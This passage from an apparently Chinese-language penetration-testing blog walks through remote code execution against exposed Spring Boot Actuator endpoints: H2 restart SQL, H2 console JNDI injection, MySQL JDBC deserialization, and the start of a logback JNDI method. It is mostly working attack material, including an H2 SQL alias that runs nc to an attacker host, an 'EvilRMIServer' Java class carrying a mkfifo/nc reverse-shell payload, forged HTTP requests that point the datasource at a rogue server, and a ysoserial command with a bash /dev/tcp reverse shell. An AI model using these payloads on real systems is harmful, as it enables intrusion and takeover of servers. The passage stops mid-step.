<h5 id="利用实例-6"><a href="#利用实例-6" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写h2 sql语句,执行nc连接目标主机192.168.233.242的端口1234</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;nc&#x27;,&#x27;192.168.233.242&#x27;,&#x27;1234&#x27;);</span><br></pre></td></tr></table></figure>



<p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2  -m    SimpleHTTPServer    8080</span><br></pre></td></tr></table></figure>



<p>POST方式构造请求数据包对&#x2F;actuator&#x2F;env端点进行请求，设置spring.datasource.data为前面开启http服务的example.sql的url地址</p>
<p>请求报文如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831171742647.png" class title="image-20210831171742647">



<p>在调用&#x2F;actuator&#x2F;restart端点进行重启springboot项目</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831173855310.png" class title="image-20210831173855310">



<p>重启springboot后反弹shell成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830181954887.png" class title="image-20210830181954887">



<h5 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li>spring-boot-autoconfigure<code>组件中的</code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java<code>文件代码逻辑中会使用</code>runScripts&#96; 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li>
</ul>
<p>详细漏洞分析参见如下；</p>
<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p>
<h4 id="2-8-h2-database-console-JNDI-RCE"><a href="#2-8-h2-database-console-JNDI-RCE" class="headerlink" title="2.8.h2 database console JNDI RCE"></a>2.8.h2 database console JNDI RCE</h4><h5 id="利用条件-10"><a href="#利用条件-10" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
<li>spring 配置中启用 h2 console  <code>spring.h2.console.enabled=true</code></li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1（LDAP 方式）</li>
</ul>
<h5 id="利用方法-9"><a href="#利用方法-9" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：访问路由获得 jsessionid</strong></p>
<p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p>
<p><strong>步骤二：准备要执行的 Java 代码</strong></p>
<p>编写优化过后的用来反弹 shell 的JAVA代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：打包JAVA代码</strong></p>
<p>将上面反弹shell的JAVA代码进行打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：架设恶意 RMI服务</strong></p>
<p>指定开启RMI服务的ip地址，使用下面命令架设对应的 RMI服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤五：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤六：发包触发 JNDI 注入</strong></p>
<p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>RMI://your-vps-ip:port/jndi</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=rmi://your-vps-ip:port/jndi&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>



<h5 id="利用实例-7"><a href="#利用实例-7" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点的&#x2F;h2-console页面，url会跳转到&#x2F;h2-console&#x2F;login.jsp?jsessionid&#x3D;10f21eec1f912ae36cd39c55740101b5</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830204241737.png" class title="image-20210830204241737">

<p>这里的开启RMI服务JAVA代码如下:</p>
<p>反弹shell到192.168.233.242的1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 8090&quot;);//RMI服务监听地址为8090</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.242 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将该代码进行maven打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830204556955.png" class title="image-20210830204556955">



<p>然后指定访问ip地址开启RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830204855751.png" class title="image-20210830204855751">



<p>使用nc监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>构造Post方式请求&#x2F;h2-console&#x2F;login.do?session&#x3D;xxxx，请求报文中指定RMI服务的ip地址和端口</p>
<p>请求报文如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=152896463738fcc39cb0a74a0e3b5a1e HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.233.242:9096/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=rmi://192.168.233.242:8090/jndi&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830211055253.png" class title="image-20210830211055253">



<p>可以看到nc连接shell成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830211733059.png" class title="image-20210830211733059">



<h5 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>设置恶意url参数向h2-console&#x2F;login.do?session&#x3D;xxxx发出请求</li>
<li>服务器访问恶意url中的RMI服务，发生JNDI注入</li>
<li>RMI服务执行其他的恶意代码</li>
</ul>
<p>详细分析参见</p>
<p><a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p>
<h4 id="2-9-mysql-jdbc-deserialization-RCE"><a href="#2-9-mysql-jdbc-deserialization-RCE" class="headerlink" title="2.9. mysql jdbc deserialization RCE"></a>2.9. mysql jdbc deserialization RCE</h4><blockquote>
<p>该环境需要安装Mysql服务和新建数据库，主要还是application.properties配置文件，注意里面的数据库相关配置(请求的数据库名，数据库账户和密码)</p>
</blockquote>
<h5 id="利用条件-11"><a href="#利用条件-11" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<h5 id="利用方法-10"><a href="#利用方法-10" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：查看环境依赖</strong></p>
<p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code>  关键词，并记录下其版本号（5.x 或 8.x）；</p>
<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p>
<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code>  值，方便后续恢复其正常 jdbc url 值。</p>
<p><strong>步骤二：架设恶意 rogue mysql server</strong></p>
<p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>
<p>这里使用反序列工具ysoserial(包含所有攻击方式，在环境包中的target目录下)ysoserial可以设置的命令参数如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$  java -jar ysoserial.jar</span><br><span class="line">Y SO SERIAL?</span><br><span class="line">Usage: java -jar ysoserial.jar [payload] &#x27;[command]&#x27;</span><br><span class="line">  Available payload types:</span><br><span class="line">     Payload             Authors                     Dependencies</span><br><span class="line">     -------             -------                     ------------</span><br><span class="line">     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2</span><br><span class="line">     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5</span><br><span class="line">     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11</span><br><span class="line">     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0</span><br><span class="line">     Clojure             @JackOfMostTrades           clojure:1.8.0</span><br><span class="line">     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</span><br><span class="line">     CommonsCollections1 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections2 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections3 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections4 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1</span><br><span class="line">     CommonsCollections6 @matthias_kaiser            commons-collections:3.1</span><br><span class="line">     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1</span><br><span class="line">     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4</span><br><span class="line">     Groovy1             @frohoff                    groovy:2.3.9</span><br><span class="line">     Hibernate1          @mbechler</span><br><span class="line">     Hibernate2          @mbechler</span><br><span class="line">     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     JRMPClient          @mbechler</span><br><span class="line">     JRMPListener        @mbechler</span><br><span class="line">     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1</span><br><span class="line">     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     Jdk7u21             @frohoff</span><br><span class="line">     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2</span><br><span class="line">     MozillaRhino1       @matthias_kaiser            js:1.7R2</span><br><span class="line">     MozillaRhino2       @_tint0                     js:1.7R2</span><br><span class="line">     Myfaces1            @mbechler</span><br><span class="line">     Myfaces2            @mbechler</span><br><span class="line">     ROME                @mbechler                   rome:1.0</span><br><span class="line">     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE</span><br><span class="line">     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2</span><br><span class="line">     URLDNS              @gebl</span><br><span class="line">     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14</span><br><span class="line">     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar (payload)  &gt; payload.ser</span><br></pre></td></tr></table></figure>

<p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
<p><strong>步骤三：设置 spring.datasource.url 属性</strong></p>
<blockquote>
<p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
</blockquote>
<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>

<p> mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>



<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>步骤五：触发数据库查询</strong></p>
<p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
<p><strong>步骤六：恢复正常 jdbc url</strong></p>
<p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p>
<h5 id="利用实例-8"><a href="#利用实例-8" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点 <a href="http://192.168.233.242:9097/actuator/evn">http://192.168.233.242:9097/actuator/evn</a>   查看环境变量设置和依赖</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210901112521481.png" class title="image-20210901112521481">



<p>然后架设恶意 rogue mysql server，使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令，讲生成的文件放置在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 ‘bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1’ &gt; payload.ser</span><br></pre></td></tr></table></figure>



<p>然后运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本开启3306端口</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210901141559697.png" class title="image-20210901141559697">



<p>POST方式构造请求&#x2F;actuator&#x2F;env，设置spring.datasource.url为上面开启服务的ip地址</p>
<p>请求报文如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9097</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 216</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;jdbc:mysql://192.168.233.242:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210901142357376.png" class title="image-20210901142357376">



<p>访问&#x2F;actuator&#x2F;refresh刷新配置</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210901142612261.png" class title="image-20210901142612261">



<p>在接着访问数据库查询的接口，在调用数据库服务的时候就会请求上面设置的url</p>
<p>例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
<p>可以看到前面开启的mysql服务中会显示连接的客户端和返回的一些内容</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210901142838024.png" class title="image-20210901142838024">



<p>shell反弹成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210901145716430.png" class title="image-20210901145716430">



<h5 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
<li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
<li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
<li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li>
<li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
</ul>
<p>详细漏洞分析参见下文</p>
<p>​    <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p>
<p>  <a href="http://cn-sec.com/archives/116934.html">  MySQL-JDBC 反序列化 | CN-SEC 中文网</a></p>
<h4 id="2-10-restart-logging-config-logback-JNDI-RCE"><a href="#2-10-restart-logging-config-logback-JNDI-RCE" class="headerlink" title="2.10.  restart logging.config logback JNDI RCE"></a>2.10.  restart logging.config logback JNDI RCE</h4><h5 id="利用条件-12"><a href="#利用条件-12" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li>
</ul>
<h5 id="利用方法-11"><a href="#利用方法-11" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 xml 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
